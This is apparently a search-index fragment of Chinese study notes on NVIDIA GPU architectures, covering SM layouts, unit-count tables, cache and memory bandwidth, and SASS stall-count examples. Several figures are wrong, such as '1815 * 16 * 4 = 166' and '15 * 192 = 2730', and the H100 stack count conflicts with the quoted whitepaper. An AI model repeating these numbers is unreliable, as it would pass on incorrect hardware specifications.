\u200b\u6bcf\u4e2a\u200b\u65f6\u949f\u200b 128 \u200b\u5b57\u8282\u200b\uff0c\u200b\u800c\u200b Turing \u200b\u67b6\u6784\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u662f\u200b 64\u3002\uff08<code>GA10x also features double the shared memory bandwidth compared to Turing (128 bytes/clock per SM versus 64 bytes/clock in Turing)</code>\uff09GeForce RTX 3080 (GA102) \u200b\u7684\u200b\u6bcf\u200b SM L1 \u200b\u5e26\u5bbd\u200b\u662f\u200b 219 GB/s\uff08\u200b\u4e00\u4e2a\u200b SM \u200b\u6709\u200b 16 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b 8B \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(1710 * 16 * 8 = 219\\) GB/s\uff09\uff0c\u200b\u800c\u200b GeForce RTX 2080 Super (TU104) \u200b\u7684\u200b\u6bcf\u200b SM L1 \u200b\u5e26\u5bbd\u200b\u662f\u200b 116 GB/s\uff08\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b 16 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u6bcf\u4e2a\u200b LD/ST unit \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b 4B \u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(1815 * 16 * 4 = 166\\) GB/s\uff09\u3002\uff08<code>Total L1 bandwidth for GeForce RTX 3080 is 219 GB/sec versus 116 GB/sec for GeForce RTX 2080 Super.</code>\uff09</p>"},{"location":"hardware/gpgpu.html#nvidia-ada-lovelace","title":"NVIDIA Ada Lovelace","text":"<p>Whitepaper: NVIDIA ADA GPU ARCHITECTURE</p> <p>Ada Lovelace \u200b\u67b6\u6784\u200b\u7684\u200b AD102 \u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>12 \u200b\u4e2a\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b 6 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b 2 \u200b\u4e2a\u200b SM\uff1a\u200b\u4e00\u5171\u200b 144 \u200b\u4e2a\u200b SM\uff08<code>The full AD102 GPU includes 12 Graphics Processing Clusters (GPCs), 72 Texture Processing Clusters (TPCs), 144 Streaming Multiprocessors (SMs)</code>\uff09</li> <li>12 \u200b\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4e00\u5171\u200b 384 \u200b\u4f4d\u200b\uff08<code>a 384-bit memory interface with 12 32-bit memory controllers</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u6709\u200b\u56db\u4e2a\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u5305\u62ec\u200b 16 \u200b\u4e2a\u200b FP32/INT32 core\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c1 \u200b\u4e2a\u200b\u7b2c\u56db\u4ee3\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU\uff08<code>Each SM in AD10x GPUs contain 128 CUDA Cores, one Ada Third-Generation RT Core, four Ada Fourth-Generation Tensor Cores, four Texture Units, a 256 KB Register File, and 128 KB of L1/Shared Memory</code>\uff0c<code>Like prior GPUs, the AD10x SM is divided into four processing blocks (or partitions), with each partition containing a 64 KB register file, an L0 instruction cache, one warp scheduler, one dispatch unit, 16 CUDA Cores that are dedicated for processing FP32 operations (up to 16 FP32 operations per clock), 16 CUDA Cores that can process FP32 or INT32 operations (16 FP32 operations per clock OR 16 INT32 operations per clock), one Ada Fourth-Generation Tensor Core, four Load/Store units, and a Special Function Unit (SFU) which executes transcendental and graphics interpolation instructions.</code>\uff09</li> <li>\u200b\u6b64\u5916\u200b\u6bcf\u4e2a\u200b SM \u200b\u8fd8\u6709\u200b 2 \u200b\u4e2a\u200b FP64 core\uff08<code>The AD102 GPU also includes 288 FP64 Cores (2 per SM) which are not depicted in the above diagram. The FP64 TFLOP rate is 1/64th the TFLOP rate of FP32 operations. The small number of FP64 Cores are included to ensure any programs with FP64 code operate correctly, including FP64 Tensor Core code.</code>\uff09</li> </ul> <p> </p> Ada Lovelace \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA ADA GPU ARCHITECTURE Figure 5\uff09"},{"location":"hardware/gpgpu.html#nvidia-hopper","title":"NVIDIA Hopper","text":"<p>Whitepaper: NVIDIA H100 Tensor Core GPU Architecture</p> <p>PPT: NVIDIA HOPPER GPU: SCALING PERFORMANCE</p> <p>H100 SXM5 \u200b\u53c2\u6570\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>TSMC 4N \u200b\u5236\u7a0b\u200b\uff0c80 billion transistor\uff08<code>The full GH100 GPU that powers the H100 GPU is fabricated using TSMC\u2019s 4N process customized for NVIDIA, with 80 billion transistors, a die size of 814 mm2, and higher frequency design.</code>\uff09</li> <li>HBM3 DRAM\uff0c5 \u200b\u4e2a\u200b stack\uff0c10 \u200b\u4e2a\u200b 512-bit memory controller\uff0c\u200b\u603b\u5171\u200b 80 GB \u200b\u5bb9\u91cf\u200b\uff08<code>6 HBM3 or HBM2e stacks, 12 512-bit Memory Controllers</code>\uff09</li> <li>H100 SXM5 \u200b\u6709\u200b 8 \u200b\u4e2a\u200b GPC\uff0c66 \u200b\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b\u4e24\u4e2a\u200b SM\uff1b\u200b\u4e00\u5171\u200b 132 \u200b\u4e2a\u200b SM\uff08<code>8 GPCs, 66 TPCs, 2 SMs/TPC, 132 SMs per GPU</code>\uff09</li> <li>\u200b\u6bcf\u4e2a\u200b SM \u200b\u5185\u90e8\u200b\u6709\u200b 16 \u200b\u4e2a\u200b INT32 \u200b\u5355\u5143\u200b\uff0c32 \u200b\u4e2a\u200b FP32 \u200b\u5355\u5143\u200b\uff0c16 \u200b\u4e2a\u200b FP64 \u200b\u5355\u5143\u200b\uff0c\u200b\u4e00\u4e2a\u200b Tensor Core\uff0c\u200b\u56db\u4e2a\u200b SFU</li> </ul> <p> </p> Hopper \u200b\u67b6\u6784\u200b SM\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA H100 Tensor Core GPU Architecture Figure 7\uff09 <p>H100 \u200b\u6709\u200b 50MB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u800c\u200b\u5b8c\u6574\u7248\u200b\u7684\u200b GH100 \u200b\u82af\u7247\u200b\u6709\u200b 60MB \u200b\u7684\u200b L2 \u200b\u7f13\u5b58\u200b\u3002\uff08<code>A 50 MB L2 cache in H100 is 1.25x larger than A100\u2019s 40 MB L2.</code>\uff09</p> <p>\u200b\u6839\u636e\u200b https://github.com/te42kyfo/gpu-benches \u200b\u5b9e\u6d4b\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u8bfb\u53d6\u200b\u7565\u591a\u4e8e\u200b 128 \u200b\u5b57\u8282\u200b\uff0825 TB/s\uff0c114 \u200b\u4e2a\u200b SM\uff0c\u200b\u65f6\u949f\u200b\u9891\u7387\u200b 1620 MHz\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b \\(25 / 114 / 1620 * 1e6 = 135\\) \u200b\u5b57\u8282\u200b\uff09\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>CUDA Kernel \u200b\u4e4b\u524d\u200b\u662f\u200b\u4e09\u4e2a\u200b\u5c42\u6b21\u200b\uff1aGrid\u3001Thread Block \u200b\u548c\u200b Thread\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u6574\u4e2a\u200b GPU\u3001SM \u200b\u548c\u200b CUDA Core\uff0c\u200b\u800c\u200b\u8fd9\u200b\u4e00\u4ee3\u200b\u5f15\u5165\u200b\u4e86\u200b Thread Block Cluster \u200b\u7684\u200b\u5c42\u6b21\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b\u56db\u4e2a\u200b\u5c42\u6b21\u200b\uff1aGrid\u3001Thread Block Cluster\u3001Thread Block \u200b\u548c\u200b Thread\u3002\uff08<code>H100 introduces a new Thread Block Cluster architecture that exposes control of locality at a granularity larger than a single Thread Block on a single SM.</code>\uff09\u200b\u5176\u4e2d\u200b Thread Block \u200b\u5bf9\u5e94\u200b GPC\uff0c\u200b\u6bcf\u4e2a\u200b GPC \u200b\u6709\u200b\u591a\u4e2a\u200b TPC\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u6709\u200b\u591a\u4e2a\u200b SM\u3002\uff08<code>The Clusters in H100 run concurrently across SMs within a GPC. A GPC is a group of SMs in the hardware hierarchy that are always physically close together.</code>\uff09</p>"},{"location":"hardware/gpgpu.html#nvidia-blackwell","title":"NVIDIA Blackwell","text":"<p>Whitepaper: NVIDIA Blackwell Architecture Technical Brief</p> <p>Datasheet: NVIDIA Blackwell Datasheet</p> <p>Datasheet: NVIDIA DGX B200 Datasheet</p>"},{"location":"hardware/gpgpu.html#sm","title":"SM \u200b\u53d1\u5c55\u200b\u5386\u53f2","text":"<p>\u200b\u4e0b\u9762\u200b\u5217\u51fa\u200b\u4e86\u200b\u5404\u200b\u67b6\u6784\u200b\u7684\u200b SM \u200b\u53d1\u5c55\u200b\u5386\u7a0b\u200b\uff0c\u200b\u53d1\u5c04\u200b\u6570\u200b\u8868\u793a\u200b\u65b9\u6cd5\u200b\u4e3a\u200b Warp \u200b\u6570\u91cf\u200b\uff08W\uff09\u200b\u4e58\u4ee5\u200b\u6bcf\u4e2a\u200b Warp \u200b\u7684\u200b\u53d1\u5c04\u200b\u6307\u4ee4\u200b\u6570\u200b\uff08I\uff09\uff1a</p> \u200b\u67b6\u6784\u200b \u200b\u5355\u7cbe\u5ea6\u200b \u200b\u53cc\u200b\u7cbe\u5ea6\u200b SFU LD/ST \u200b\u53d1\u5c04\u200b\u6570\u200b \u200b\u5355\u7cbe\u5ea6\u200b/\u200b\u53d1\u5c04\u200b\u6570\u200b Tesla 1.0 G80 8 0 2 N/A 1 W * 1 I 8 Tesla 2.0 GT200 8 1 2 N/A 1 W * 1 I 8 Fermi GF100 32 16 4 16 2 W * 1 I 16 Kepler GK210 192 64 32 32 4 W * 2 I 24 Maxwell GM204 (per PB) 32 1 8 8 1 W * 2 I 16 Maxwell GM204 (per SM) 128 4 32 32 4 W * 2 I 16 Pascal GP100 (per PB) 32 16 8 8 1 W * 2 I 16 Pascal GP100 (per SM) 64 32 16 16 2 W * 2 I 16 Volta GV100 (per PB) 16 8 4 8 1 W * 1 I 16 Volta GV100 (per SM) 64 32 16 32 4 W * 1 I 16 Turing TU102 (per PB) 16 0 4 4 1 W * 1 I 16 Turing TU102 (per SM) 64 2 16 16 4 W * 1 I 16 Ampere GA100 (per PB) 16 8 4 8 1 W * 1 I 16 Ampere GA100 (per SM) 64 32 16 32 4 W * 1 I 16 Ampere GA102 (per PB) 32 0 4 4 1 W * 1 I 32 Ampere GA102 (per SM) 128 2 16 16 4 W * 1 I 32 Ada Lovelace AD102 (per PB) 32 0 4 4 1 W * 1 I 32 Ada Lovelace AD102 (per SM) 128 2 16 16 4 W * 1 I 32 Hopper GH100 (per PB) 32 16 4 8 1 W * 1 I 32 Hopper GH100 (per SM) 128 64 16 32 4 W * 1 I 32 <p>\u200b\u6ce8\u200b\uff1aTU102\u3001GA102 \u200b\u548c\u200b AD102 \u200b\u7b49\u200b\u663e\u5361\u200b\u662f\u200b\u6e38\u620f\u5361\u200b\uff0c\u200b\u56e0\u6b64\u200b FP64 \u200b\u5355\u5143\u200b\u5f88\u5c11\u200b\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u53ea\u6709\u200b\u4e24\u4e2a\u200b\u3002</p> <p>\u200b\u5404\u200b\u67b6\u6784\u200b SM \u200b\u7684\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u6027\u80fd\u200b\uff08\u200b\u53c2\u8003\u200b Throughput of Native Arithmetic Instructions \u200b\u548c\u200b Matching CUDA arch and CUDA gencode for various NVIDIA architectures \u200b\u548c\u200b Throughput of Native Arithmetic Instructions CUDA 8.0 \u200b\u548c\u200b CUDA - Wikipedia\uff09</p> \u200b\u67b6\u6784\u200b \u200b\u534a\u200b\u7cbe\u5ea6\u200b \u200b\u5355\u7cbe\u5ea6\u200b \u200b\u53cc\u200b\u7cbe\u5ea6\u200b \u200b\u7279\u6b8a\u200b\u51fd\u6570\u200b Fermi (SM 2.0, GF100/GF110) N/A 32 16 4 Fermi (SM 2.1, GF104-108, GF114-119) N/A 48 4 8 Kepler (SM 3.0, GK104-GK107) N/A 192 8 32 Kepler (SM 3.2, GK20A) N/A 192 8 32 Kepler (SM 3.5, GK110, GK208) N/A 192 64 32 Kepler (SM 3.7, GK210) N/A 192 64 32 Maxwell (SM 5.0, GM107-108) N/A 128 4 32 Maxwell (SM 5.2, GM200-206) N/A 128 4 32 Maxwell (SM 5.3, GM20B) 256 128 4 32 Pascal (SM 6.0, GP100) 128 64 32 16 Pascal (SM 6.1, GP102-GP108) 2 128 4 32 Pascal (SM 6.2, GP10B) 256 128 4 32 Volta (SM 7.0, GV100) 128 64 32 16 Volta (SM 7.2, GV10B-GV11B) 128 64 32 16 Turing (SM 7.5, TU102-TU117) 128 64 2 16 Ampere (SM 8.0, GA100) 256 64 32 16 Ampere (SM 8.6, GA102-GA107) 256 128 2 16 Ada Lovelace (SM 8.9, AD102-AD107) 128 128 2 16 Hopper (SM 9.0, GH100) 256 128 64 16 <p>\u200b\u5404\u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b PB \u200b\u4e2d\u200b\u5305\u62ec\u200b\u7684\u200b\u5355\u5143\u200b\u6570\u91cf\u200b\uff1a</p> \u200b\u67b6\u6784\u200b FP32 INT32 FP32/INT32 FP64 LD/ST Tensor Core SFU Maxwell (GM204) 0 0 32 0 8 0 8 Pascal (GP100) 0 0 32 16 8 0 8 Volta (GV100) 16 16 0 8 8 2x 1st Gen 4 Turing (TU102) 16 16 0 0 4 2x 2nd Gen 4 Ampere (GA100) 16 16 0 8 8 1x 3rd Gen 4 Ampere (GA102) 16 0 16 0 4 1x 3rd Gen 4 Ada Lovelace (AD102) 16 0 16 0 4 1x 4th Gen 4 Hopper (GH100) 32 16 0 16 8 1x 4th Gen 4 <p>\u200b\u6ce8\u200b\uff1aVolta \u200b\u628a\u200b FP32/INT32 core \u200b\u62c6\u5206\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u6267\u884c\u200b\u4e24\u7c7b\u200b\u6307\u4ee4\u200b\uff0c\u200b\u800c\u200b Pascal \u200b\u4e0d\u884c\u200b\u3002\uff08<code>Unlike Pascal GPUs, which could not execute FP32 and INT32 instructions simultaneously, the Volta GV100 SM includes separate FP32 and INT32 cores, allowing simultaneous execution of FP32 and INT32 operations at full throughput, while also increasing instruction issue throughput.</code>\uff09</p> <p>\u200b\u5404\u200b\u82af\u7247\u200b\u7684\u200b SM \u200b\u6570\u91cf\u200b\u548c\u200b CUDA Core \u200b\u6570\u91cf\u200b\uff1a</p> <ul> <li>G80: 16 SM(8 TPC * 2 SM/TPC) * 8 = 128 CUDA core</li> <li>GF100: 16 SM(4 GPC * 4 SM/GPC) * 32 = 512 CUDA core</li> <li>GK210: 15 SM(15 SM) * 192 = 2730 CUDA core</li> <li>GM204: 16 SM(4 GPC * 4 SM/GPC) * 128(4 PB * 32 Core/PB) = 2048 CUDA core</li> <li>GP100: 60 SM(6 GPC * 5 TPC/GPC * 2 SM/TPC) * 64(2 PB * 32 Core/PB) = 3840 CUDA core</li> <li>GV100: 84 SM(6 GPC * 7 TPC/GPC * 2 SM/TPC) * 64(4 PB * 16 Core/PB) = 5376 CUDA core</li> <li>TU102: 72 SM(6 GPC * 6 TPC/GPC * 2 SM/TPC) * 64(4 PB * 16 Core/PB) = 4608 CUDA core</li> <li>GA100: 128 SM(8 GPC * 8 TPC/GPC * 2 SM/TPC) * 64(4 PB * 16 Core/PB) = 8192 CUDA core</li> <li>GA102: 84 SM(7 GPC * 6 TPC/GPC * 2 SM/TPC) * 128(4 PB * 32 Core/PB) = 10752 CUDA core</li> <li>AD102: 144 SM(12 GPC * 6 TPC/GPC * 2 SM/TPC) * 128(4 PB * 32 Core/PB) = 18432 CUDA core</li> <li>GH100: 144 SM(8 GPC * 9 TPC/GPC * 2 SM/TPC) * 128(4 PB * 32 Core/PB) = 18432 CUDA core</li> </ul> <p>\u200b\u5f88\u200b\u6709\u610f\u601d\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b\u5c42\u6b21\u7ed3\u6784\u200b\uff1a</p> <ul> <li>SM</li> <li>TPC - SM</li> <li>GPC - SM</li> <li>GPC - TPC - SM</li> </ul>"},{"location":"hardware/gpgpu.html#smpb","title":"SM/PB \u200b\u53d1\u5c55\u200b\u5386\u53f2","text":"<p>\u200b\u5982\u679c\u200b\u4ee5\u200b SM \u200b\u6216\u200b PB \u200b\u7684\u200b\u6700\u5c0f\u200b\u7c92\u5ea6\u200b\u6765\u770b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u53d1\u5c55\u200b\u5386\u53f2\u200b\u662f\u200b\uff1a</p> <ul> <li>Tesla\uff1a\u200b\u4e00\u4e2a\u200b SM \u200b\u53ea\u6709\u200b Instruction cache \u200b\u548c\u200b Constant cache\uff0c8 \u200b\u4e2a\u200b CUDA core\uff0c2 \u200b\u4e2a\u200b SFU\uff0c16KB \u200b\u7684\u200b shared memory</li> <li>Fermi\uff1aInstruction Cache\uff0c\u200b\u4e24\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c\u200b\u6709\u200b 32 \u200b\u4e2a\u200b CUDA core\uff0c16 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU\uff0c64 KB \u200b\u7684\u200b shared memory/L1 cache</li> <li>Kepler\uff1aInstruction Cache\uff0c\u200b\u56db\u4e2a\u200b\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c\u200b\u6709\u200b 192 \u200b\u4e2a\u200b CUDA core\uff0c64 \u200b\u4e2a\u200b DP unit\uff0c32 \u200b\u4e2a\u200b SFU\uff0c32 \u200b\u4e2a\u200b LD/ST\uff0c65536 \u200b\u6216\u200b 131072 * 32 bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c64KB \u200b\u6216\u8005\u200b 128KB \u200b\u7684\u200b shared memory/L1 cache\uff0c48KB \u200b\u7684\u200b readonly data cache</li> <li>Maxwell\uff1a\u200b\u5f00\u59cb\u200b\u62c6\u5206\u200b Processing Block\uff0c\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b Instruction Buffer\uff0c\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c32 \u200b\u4e2a\u200b CUDA core\uff0c1 \u200b\u4e2a\u200b DP unit\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c8 \u200b\u4e2a\u200b SFU</li> <li>Pascal\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b Instruction Buffer\uff0c\u200b\u4e00\u4e2a\u53cc\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c32768 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c32 \u200b\u4e2a\u200b CUDA core\uff0c16 \u200b\u4e2a\u200b DP unit\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c8 \u200b\u4e2a\u200b SFU</li> <li>Volta\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b L0 Instruction Cache\uff0c\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c2 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Turing\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c2 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Ampere\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c8 \u200b\u4e2a\u200b FP64 core\uff0c1 \u200b\u4e2a\u200b Tensor Core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Ada Lovelace\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c16 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b FP32/INT32 core\uff0c1 \u200b\u4e2a\u200b Tensor Core\uff0c4 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> <li>Hopper\uff1a\u200b\u6bcf\u4e2a\u200b PB \u200b\u5185\u90e8\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5355\u200b\u53d1\u5c04\u200b\u7684\u200b Warp Scheduler\uff0c16384 * 32-bit \u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff0c32 \u200b\u4e2a\u200b FP32 core\uff0c16 \u200b\u4e2a\u200b INT32 core\uff0c16 \u200b\u4e2a\u200b FP64 core\uff0c1 \u200b\u4e2a\u200b Tensor Core\uff0c8 \u200b\u4e2a\u200b LD/ST unit\uff0c4 \u200b\u4e2a\u200b SFU</li> </ul>"},{"location":"hardware/gpgpu.html#_1","title":"\u5185\u5b58\u200b\u5c42\u6b21","text":"\u67b6\u6784\u200b L2 \u200b\u5927\u5c0f\u200b L2 B/clk L2 \u200b\u5e26\u5bbd\u200b \u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b Kepler (GK110) 1536 KB ? ? ? Maxwell (GM200) 3072 KB ? ? ? Pascal (GP100, P100) 4096 KB ? ? 732 GB/s Volta (GV100, V100) 6144 KB 2048 3133.440 GB/s 900 GB/s Turing (TU102) ? ? ? ? Ampere (GA100, A100) 40960 KB 5120 7219.200 GB/s 1555 GB/s Ampere (GA102) ? ? ? ? Ada Lovelace (AD102, L40) 98304 KB ? ? 864 GB/s Hopper (GH100, H100 SXM5) 51200 KB ? ? 3352 GB/s <p>\u200b\u5907\u6ce8\u200b\uff1a</p> <ul> <li>L2 \u200b\u5e26\u5bbd\u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\uff1a\u200b\u9891\u7387\u200b * \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b\u5b57\u8282\u6570\u200b\u3002</li> <li><code>A100 2.3x L2 BW vs V100</code>: \\(7219.200 / 3133.40 = 2.3\\)</li> <li><code>A100 6.7x L2 capacity vs V100</code>: \\(40960 / 6144 = 6.7\\)</li> <li><code>A100 1.7x DRAM BW vs V100</code>: \\(1555 / 900 = 1.7\\)</li> </ul>"},{"location":"hardware/gpgpu.html#control-code","title":"Control Code","text":"<p>\u200b\u524d\u200b\u6587\u200b\u63d0\u5230\u200b\uff0c\u200b\u4ece\u200b Kepler \u200b\u67b6\u6784\u200b\u5f00\u59cb\u200b\uff0c\u200b\u6307\u4ee4\u96c6\u200b\u52a0\u5165\u200b\u4e86\u200b Control Code \u200b\u4fe1\u606f\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b9e\u73b0\u200b\u8c03\u5ea6\u200b\u3002\u200b\u4e0b\u9762\u200b\u6765\u200b\u7ed3\u5408\u200b\u4e00\u4e9b\u200b\u7528\u200b CuAssembler \u200b\u5f97\u5230\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u6765\u200b\u5206\u6790\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#stall-count","title":"Stall count","text":"<p>\u200b\u9996\u5148\u200b\u662f\u200b Stall Count\uff0c\u200b\u4ee5\u200b Ampere SM8.0 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u67b6\u6784\u200b\u91cc\u200b\u6bcf\u4e2a\u200b PB \u200b\u53ea\u6709\u200b 8 \u200b\u4e2a\u200b LD/ST unit\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u6761\u200b Load/Store \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u53d1\u5c04\u200b\u5b8c\u6210\u200b\u3002\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b Load/Store \u200b\u8d28\u91cf\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b Stall count \u200b\u4f1a\u200b\u662f\u200b 4\uff1a</p> <pre><code>[B------:R-:W3:-:S04]          /*0090*/                   LDG.E R8, [R2.64] ;                       /* 0x0000000402087981 */\n[B------:R-:W3:-:S04]          /*00a0*/                   LDG.E R9, [R2.64+0x4] ;                   /* 0x0000040402097981 */\n[B------:R-:W3:-:S04]          /*00b0*/                   LDG.E R10, [R2.64+0x8] ;                  /* 0x00000804020a7981 */\n[B------:R-:W3:-:S04]          /*00c0*/                   LDG.E R17, [R4.64] ;                      /* 0x0000000404117981 */\n[B------:R-:W3:-:S04]          /*00d0*/                   LDG.E R12, [R4.64+0x4] ;                  /* 0x00000404040c7981 */\n[B------:R-:W3:-:S04]          /*00e0*/                   LDG.E R13, [R6.64] ;                      /* 0x00000004060d7981 */\n[B------:R-:W3:-:S04]          /*00f0*/                   LDG.E R14, [R6.64+0x4] ;                  /* 0x00000404060e7981 */\n[B------:R-:W3:-:S01]          /*0100*/                   LDG.E R15, [R6.64+0x8] ;                  /* 0x00000804060f7981 */\n\n[B------:R-:W-:-:S04]          /*0150*/                   STG.E [R8.64], R12 ;                      /* 0x0000000c08007986 */\n[B------:R-:W-:-:S04]          /*0160*/                   STG.E [R8.64+0x4], R13 ;                  /* 0x0000040d08007986 */\n[B------:R-:W-:-:S04]          /*0170*/                   STG.E [R8.64+0x8], R14 ;                  /* 0x0000080e08007986 */\n[B------:R-:W-:-:S01]          /*0180*/                   STG.E [R8.64+0xc], R15 ;                  /* 0x00000c0f08007986 */\n</code></pre> <p>\u200b\u8fde\u7eed\u200b\u7684\u200b LDG/STG \u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b Stall count \u200b\u4e0d\u200b\u7b49\u4e8e\u200b 4\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u4e0d\u662f\u200b Load/Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u7b49\u200b Load/Store \u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u4f1a\u200b\u6324\u5360\u200b dispatch port\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53d1\u5c04\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002</p> 